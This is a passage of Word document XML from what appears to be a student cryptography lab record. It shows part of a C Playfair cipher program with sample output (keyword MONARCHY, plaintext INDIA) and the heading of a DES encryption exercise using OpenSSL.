        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>])</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="2228"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="2936"/>
      </w:pPr>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>w2=r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>2=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2936"/>
      </w:pPr>
      <w:r>
        <w:t>foundCo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>=1;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2228"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f((foundRo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>==1)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>(foundC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l=</w:t>
      </w:r>
      <w:r>
        <w:t>=1))</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2228"/>
      </w:pPr>
      <w:r>
        <w:t>brea</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pP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t>vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>d d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>sp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ayMa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="810" w:right="6674"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>; pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n"); for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;j</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;j</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2228"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:t>c ",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>]);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>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0"/>
        <w:ind w:left="100" w:right="8119"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="4662"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:hyperlink r:id="rId19">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gcc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ayfa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>.c</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="5353"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:hyperlink r:id="rId2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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>a.o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="5941"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Ke</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>word:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ARCHY </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t:</w:t>
      </w:r>
      <w:r>
        <w:t>INDIA</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="7833"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>O N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>R C H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>B D E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>F G I K</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="7994"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Q S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>T</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="6789"/>
      </w:pPr>
      <w:r>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>X Z C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:t>ABK</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="6" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="8213"/>
        <w:jc w:val="both"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="134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line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">o.: 6                                                                                                             </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="54"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ate:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1680" w:bottom="280" w:left="1140" w:header="0" w:footer="1185" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="-56"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>m:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="3788" w:right="3939"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:br w:type="column"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DES</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>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D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>S sy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>mm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">pher </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>echn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>que</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>us</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ng open</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>sl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>brary</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>n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In</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
